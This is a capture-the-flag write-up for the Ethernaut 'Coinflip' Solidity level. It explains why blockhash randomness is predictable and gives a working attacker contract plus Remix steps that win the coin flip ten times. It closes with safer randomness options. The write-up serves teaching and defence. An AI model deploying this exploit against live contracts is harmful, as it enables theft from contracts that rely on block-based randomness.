# Coinflip

## Key:

> Do not rely on block.timestamp, now and blockhash as a source of randomness, unless you know what you are doing. Both the timestamp and the block hash can be influenced by miners to some degree. Bad actors in the mining community can for example run a casino payout function on a chosen hash and just retry a different hash if they did not receive any money.
> https://docs.soliditylang.org/en/v0.4.24/units-and-global-variables.html

**We can create an attacker contract with the same non-random algorithm that invoque the victim's flip function with the correct answer precalculated**

## Attacker contract

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';
import './CoinFlip.sol';

contract CoinFlipAttack {
  using SafeMath for uint256;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip public victimContract;

  constructor() public {
    // Change to victims address instanciation
    victimContract = CoinFlip(0x2AC87251F9811CA75e6A2e11Cf91E38b1Cc91042);
  }

  function flip() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    victimContract.flip(side);
  }
}
```

### Exploitation

1. Load Coinflip.sol original code in Remix, and deploy it.
2. Load and deploy CoinflipAttack.sol with the address of the instance of the Coinflip contract given by Ethernaut's `contract.address()`.
3. Use Remix to flip coins 10 times in the CoinFlipAttacker contract.
   4 Verify the accumulator `consecutiveWins` is now 10

```js
await contract.consecutiveWins();
```

## Post solution info

Generating random numbers in solidity can be tricky. There currently isn't a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.

To get cryptographically proven random numbers, you can use Chainlink VRF, which uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.

Some other options include using Bitcoin block headers (verified through BTC Relay), RANDAO, or Oraclize).
